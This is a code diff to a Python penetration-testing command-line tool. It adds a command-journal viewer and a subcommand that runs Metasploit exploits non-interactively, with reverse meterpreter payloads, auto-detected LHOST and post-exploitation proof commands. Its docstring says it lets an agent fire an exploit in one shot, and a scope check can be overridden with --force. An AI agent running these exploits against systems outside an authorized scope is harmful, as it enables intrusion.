@@ -690,6 +690,136 @@ def _scope_targets_str():
     return " ".join(out)
 
 
+def show_commands(args):
+    """Print the command journal so the operator can review/replay the chain so far."""
+    if not os.path.isdir(COMMANDS_DIR):
+        print("(no commands journaled yet — run commands through `bin/cpent ev`)")
+        return
+    tool_files = sorted(f for f in os.listdir(COMMANDS_DIR)
+                        if f.endswith(".md") and not f.startswith("_"))
+
+    if args.list:
+        print(f"journaled tools ({len(tool_files)}):")
+        for f in tool_files:
+            n = sum(1 for l in open(os.path.join(COMMANDS_DIR, f)) if l.startswith("- "))
+            print(f"  {f[:-3]:<20} {n} distinct command(s)")
+        print("\nShow one:  bin/cpent commands <tool>   |   all:  bin/cpent commands")
+        return
+
+    if args.tool:
+        # match <tool> or <tool>.md, case-insensitive
+        want = args.tool.lower().removesuffix(".md")
+        match = next((f for f in tool_files if f[:-3].lower() == want), None)
+        if not match:
+            print(f"no journal for '{args.tool}'. Available: "
+                  f"{', '.join(f[:-3] for f in tool_files) or '(none)'}")
+            return
+        print(open(os.path.join(COMMANDS_DIR, match)).read())
+        return
+
+    # default: the chronological timeline
+    timeline = os.path.join(COMMANDS_DIR, "_timeline.md")
+    if os.path.exists(timeline):
+        print(open(timeline).read())
+        print(f"\nPer-tool files: {', '.join(f[:-3] for f in tool_files)}  "
+              f"(bin/cpent commands <tool>)")
+    else:
+        print("(timeline empty)")
+
+
+def _msf_run_console(cmdline, target_ip, label, background, timeout=1800):
+    """Run msfconsole non-interactively (-x) and capture as evidence.
+    cmdline must not contain single quotes (we wrap -x in single quotes)."""
+    full = f"msfconsole -q -x '{cmdline}'"
+    print(f"[msf] {full}")
+    if background:
+        run_in_background(label, target_ip, capture_command, full, target_ip,
+                          "network-system", label, timeout=timeout)
+    else:
+        capture_command(full, target_ip, "network-system", label, timeout=timeout)
+
+
+def run_msf(args):
+    """Drive Metasploit non-interactively: search / run / check / rc — so the agent can
+    fire a whole exploit in one shot instead of sitting in the msfconsole REPL."""
+    action = args.msfaction
+
+    if action == "search":
+        terms = " ".join([t for t in ([args.module] + args.query) if t]).strip()
+        if not terms:
+            sys.exit("usage: cpent msf search <term> [term2 ...]   e.g. msf search cve:2021-34527")
+        # sanitise single quotes out of the query (we wrap -x in single quotes)
+        terms = terms.replace("'", "")
+        cmdline = f"search {terms}; exit"
+        _msf_run_console(cmdline, "msf-search", f"msf-search-{terms.split()[0]}"[:40],
+                         args.background, timeout=300)
+        return
+
+    # run / check / rc all touch a target → scope-gated
+    if not args.ip:
+        sys.exit(f"[msf] --ip <target> is required for '{action}'")
+    enforce_scope(args.ip, force=args.force)
+
+    if action == "rc":
+        rc_path = args.module
+        if not rc_path or not os.path.exists(rc_path):
+            sys.exit(f"[msf] resource script not found: {rc_path}")
+        full = f"msfconsole -q -r {rc_path}"
+        label = f"msf-rc-{os.path.basename(rc_path)}"[:40]
+        if args.background:
+            run_in_background(label, args.ip, capture_command, full, args.ip,
+                              "network-system", label, timeout=1800)
+        else:
+            capture_command(full, args.ip, "network-system", label, timeout=1800)
+        return
+
+    module = args.module
+    if not module:
+        sys.exit(f"[msf] module is required: cpent msf {action} <module> --ip <ip> ...")
+    module = module.replace("'", "")
+
+    parts = [f"use {module}", f"set RHOSTS {args.ip}"]
+    for kv in (args.opt or []):
+        if "=" not in kv:
+            sys.exit(f"[msf] bad -o option (want KEY=VALUE): {kv}")
+        k, v = kv.split("=", 1)
+        parts.append(f"set {k} {v.replace(chr(39), '')}")
+
+    if action == "check":
+        parts += ["check", "exit -y"]
+        _msf_run_console("; ".join(parts), args.ip,
+                         f"msf-check-{module.split('/')[-1]}"[:40], args.background, timeout=600)
+        return
+
+    # action == run (exploit)
+    if args.payload:
+        parts.append(f"set PAYLOAD {args.payload}")
+    # LHOST: explicit, or auto-detect the VPN/tun interface for reverse payloads
+    lhost = args.lhost
+    if lhost in (None, "auto"):
+        _, tun_ip = get_vpn_interface()
+        if tun_ip:
+            lhost = tun_ip
+            print(f"[msf] LHOST auto-detected (tun): {lhost}")
+        elif args.lhost == "auto":
+            sys.exit("[msf] --lhost auto but no tun/tap interface found — pass --lhost <ip>")
+    if lhost:
+        parts.append(f"set LHOST {lhost}")
+    if args.lport:
+        parts.append(f"set LPORT {args.lport}")
+
+    parts.append("set ExitOnSession false")
+    parts.append("exploit -z")          # run, background any session, don't drop into it
+    parts.append("sessions -l")          # show sessions created (evidence)
+    proof = (args.proof or "").replace("'", "")
+    if proof:
+        parts.append(f'sessions -C "{proof}"')   # run a proof cmd on shell sessions
+    parts.append("exit -y")
+
+    _msf_run_console("; ".join(parts), args.ip,
+                     f"msf-exploit-{module.split('/')[-1]}"[:40], args.background, timeout=1800)
+
+
 def run_spray(args):
     """Spray a single credential across every in-scope host via netexec/crackmapexec."""
     targets = _scope_targets_str()
@@ -750,6 +880,11 @@ def main():
     # jobs: list background job status
     sub.add_parser("jobs", help="List background job status")
 
+    # commands: view the command journal (replay the chain)
+    cj = sub.add_parser("commands", help="Show the command journal (timeline or per-tool)")
+    cj.add_argument("tool", nargs="?", help="Show commands for this tool (e.g. nmap)")
+    cj.add_argument("--list", action="store_true", help="List journaled tools")
+
     # screenshot: just take a screenshot
     scr = sub.add_parser("screenshot", help="Take an annotated screenshot")
     scr.add_argument("--ip", required=True, help="Target IP to annotate")
@@ -781,6 +916,23 @@ def main():
     spray.add_argument("--background", "--bg", action="store_true", help="Run detached")
     spray.add_argument("--force", action="store_true", help="Override scope block")
 
+    # msf: drive Metasploit non-interactively (search / run / check / rc)
+    m = sub.add_parser("msf", help="Drive Metasploit non-interactively (one-shot)")
+    m.add_argument("msfaction", choices=["search", "run", "check", "rc"])
+    m.add_argument("module", nargs="?",
+                   help="module path (run/check), search query, or .rc path")
+    m.add_argument("query", nargs="*", help="extra search terms")
+    m.add_argument("--ip", help="RHOSTS target (required for run/check/rc)")
+    m.add_argument("--lhost", help="LHOST for reverse payloads ('auto' = detect tun)")
+    m.add_argument("--lport", type=int, help="LPORT for reverse payloads")
+    m.add_argument("--payload", help="override the payload (e.g. windows/x64/meterpreter/reverse_tcp)")
+    m.add_argument("-o", "--opt", action="append", default=[],
+                   help="extra module option KEY=VALUE (repeatable)")
+    m.add_argument("--proof", help="command to run on the session after exploit (e.g. 'whoami')")
+    m.add_argument("--background", "--bg", action="store_true", dest="background",
+                   help="Run detached")
+    m.add_argument("--force", action="store_true", help="Override scope block")
+
     # proof: capture proof-of-access block on a remote target
     prf = sub.add_parser("proof", help="Run the proof-of-access block and save evidence")
     prf.add_argument("--ip", required=True, help="Target IP")
@@ -797,6 +949,10 @@ def main():
 
     if args.action == "jobs":
         list_jobs(args)
+        return
+
+    if args.action == "commands":
+        show_commands(args)
         return
 
     if args.action == "capture":
@@ -840,6 +996,9 @@ def main():
 
     elif args.action == "spray":
         run_spray(args)
+
+    elif args.action == "msf":
+        run_msf(args)
 
     elif args.action == "proof":
         if args.os == "linux":
